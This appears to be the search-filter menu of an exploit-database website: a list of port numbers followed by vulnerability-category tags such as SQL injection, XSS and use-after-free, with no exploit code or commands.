5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


